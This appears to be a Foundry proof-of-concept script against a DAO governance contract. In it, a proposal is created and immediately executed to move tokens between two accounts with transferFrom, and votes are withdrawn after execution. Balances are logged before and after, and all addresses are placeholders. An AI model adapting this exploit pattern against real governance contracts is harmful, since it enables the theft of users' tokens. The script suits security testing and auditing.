// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "forge-std/Script.sol";
import '../contracts/interfaces/IDiamondCut.sol';
import '../contracts/interfaces/IGovernance.sol';

contract Poc is Script {
    address governance = address(0x2);
    address token = address(0x3);
    address zin = address(0x0);
    address bean5oup = address(0x1);

    function setUp() public {

    }

    function run() public {
        console.log('token: ');
        console.log('zin: ', IERC20(token).balanceOf(zin));
        console.log('bean5oup: ', IERC20(token).balanceOf(bean5oup));
        vm.startBroadcast(vm.envUint("PK_"));
        
        // vm.warp(block.timestamp + 6 minutes);
        uint256 id = 0;
        IGovernance(governance).execute(id);
        IGovernance(governance).withdrawVotes(id);

        vm.stopBroadcast();
        console.log('token: ');
        console.log('zin: ', IERC20(token).balanceOf(zin));
        console.log('bean5oup: ', IERC20(token).balanceOf(bean5oup));
    }

    function run2() public {
        console.log('token: ');
        console.log('zin: ', IERC20(token).balanceOf(zin));
        console.log('bean5oup: ', IERC20(token).balanceOf(bean5oup));
        
        vm.startBroadcast(vm.envUint("PK_"));

        address[] memory targets = new address[](1);
        targets[0] = token;

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes4[] memory signatures = new bytes4[](1);
        signatures[0] = bytes4(keccak256('transferFrom(address,address,uint256)'));

        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(zin, bean5oup, 200);

        uint256 id = IGovernance(governance).propose(5 minutes, targets, values, signatures, data, 'test');
        console.log('propose id: ', id);

        IGovernance(governance).execute(id);

        // vm.warp(block.timestamp + 6 minutes);
        // IGovernance(governance).execute(id);

        vm.stopBroadcast();

        console.log('token: ');
        console.log('zin: ', IERC20(token).balanceOf(zin));
        console.log('bean5oup: ', IERC20(token).balanceOf(bean5oup));
    }
}